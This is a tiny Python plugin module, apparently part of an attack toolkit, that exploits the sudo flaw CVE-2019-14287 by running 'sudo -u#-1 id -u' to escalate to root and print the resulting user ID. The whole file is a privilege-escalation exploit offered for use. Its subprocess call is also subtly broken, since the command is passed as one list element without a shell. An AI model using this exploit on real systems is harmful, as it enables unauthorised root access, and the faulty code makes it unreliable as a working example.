# Bypass root. CVE-2019-14287

def name():
    return "rooted"

def help():
    return "By pass sudo"

def args():
    return ""


def run(args):
    from subprocess import run, DEVNULL, PIPE
    proc = run(["sudo -u#-1 id -u"], stdout=PIPE, stderr=DEVNULL)
    print(proc.stdout.decode("utf-8"))
